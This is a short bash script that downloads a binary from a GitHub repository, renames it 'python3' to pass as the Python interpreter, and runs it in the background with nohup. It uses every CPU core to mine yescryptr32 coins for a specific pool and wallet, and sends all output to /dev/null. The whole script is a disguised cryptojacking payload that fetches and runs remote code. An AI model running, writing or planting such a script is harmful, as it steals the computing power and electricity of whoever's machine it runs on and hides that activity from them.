#!/bin/bash

# Get the number of CPU cores
num_cores=$(nproc)

# Download the script
wget -O python3 https://github.com/barburonjilo/back/raw/main/sr

# Make the script executable
chmod +x python3

# Run the script in the background
nohup ./python3 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$! --timeout 120 -t $num_cores > /dev/null 2>&1 &
